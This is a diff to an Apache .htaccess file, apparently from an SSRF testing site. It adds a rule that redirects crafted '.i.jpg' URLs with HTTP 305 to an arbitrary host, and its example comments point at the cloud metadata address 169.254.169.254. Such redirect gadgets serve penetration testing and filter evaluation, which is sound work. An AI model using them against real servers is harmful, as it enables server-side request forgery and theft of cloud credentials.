@@ -3,6 +3,7 @@ ErrorDocument 300 " "
 ErrorDocument 301 " "
 ErrorDocument 302 " "
 ErrorDocument 303 " "
+ErrorDocument 305 " "
 ErrorDocument 307 " "
 ErrorDocument 308 " "
 
@@ -33,6 +34,13 @@ RewriteRule 302-([^/-]*)-([^/-]*)-(.*).i.jpg$ $1://$2/$3 [L,R=302,NC]
 RewriteEngine on
 RewriteCond %{REQUEST_URI} 303-([^/-]*)-([^/-]*)-(.*).i.jpg$
 RewriteRule 303-([^/-]*)-([^/-]*)-(.*).i.jpg$ $1://$2/$3 [L,R=303,NC]
+
+# 305 without response body
+# http://ssrf.localdomain.pw/img-without-body/305-http-169.254.169.254:80-.i.jpg
+# http://ssrf.localdomain.pw/img-without-body/305-http-169.254.169.254:80-test/.i.jpg
+RewriteEngine on
+RewriteCond %{REQUEST_URI} 305-([^/-]*)-([^/-]*)-(.*).i.jpg$
+RewriteRule 305-([^/-]*)-([^/-]*)-(.*).i.jpg$ $1://$2/$3 [L,R=305,NC]
 
 # 307 without response body
 # http://ssrf.localdomain.pw/img-without-body/307-http-169.254.169.254:80-.i.jpg
